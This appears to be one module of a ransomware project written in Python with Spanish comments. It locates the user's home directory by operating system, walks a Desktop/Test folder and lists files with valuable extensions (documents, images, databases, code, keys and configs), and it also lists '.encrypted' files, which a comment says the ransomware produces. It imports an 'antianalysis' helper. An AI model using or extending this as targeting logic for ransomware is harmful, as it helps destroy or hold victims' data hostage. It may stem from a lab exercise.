import os
from antianalysis import so_detection

def is_important_file(file):
    extensions = {
        'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.svg', '.ico', '.heif', '.heic'],
        'videos': ['.mp4', '.avi', '.mov', '.mkv', '.webm', '.flv', '.wmv', '.3gp', '.mpeg', '.mpg'],
        'music': ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.aiff', '.alac'],
        'documents': ['.pdf', '.doc', '.docx', '.odt', '.txt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.md'],
        'databases': ['.db', '.sqlite', '.sql', '.mdb', '.accdb', '.json', '.xml'],
        'compressed_files': ['.zip', '.rar', '.7z', '.tar', '.gz', '.tar.gz', '.bz2', '.xz', '.cab'],
        'executable_files': ['.exe', '.msi', '.bat', '.sh', '.apk', '.jar', '.bin', '.deb', '.rpm'],
        'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
        'configuration_files': ['.ini', '.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
        'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
        'encrypted_extension': ['.encrypted'] #extensión archivos cifrados por el ransomware
    }
    _, extension = os.path.splitext(file)
    return any(extension.lower() in ext_list for ext_list in extensions.values())

def find_files(): # Función que obtiene el directorio y lo pasa a walk_directory
    so = so_detection()
    if so == "Windows":
        directorio_base = os.environ.get('USERPROFILE', None)
    elif so == "Linux":
        directorio_base = os.environ.get('HOME', None)
    if not directorio_base:
        return "No se ha encontrado el directorio en la variable de entorno."
    directorio = os.path.join(directorio_base, 'Desktop', 'Test')
    return walk_directory(directorio)

def walk_directory(directorio): # Función que recorre un directorio dado y devuelve los archivos importantes
    if not os.path.isdir(directorio):
        return f"El directorio {directorio} no existe."
    important_files = []
    for root, _, files in os.walk(directorio):
        for file in files:
            if is_important_file(file):
                important_files.append(os.path.join(root, file))  # Devuelve ruta absoluta
    return important_files  # Devuelve una lista de los archivos importantes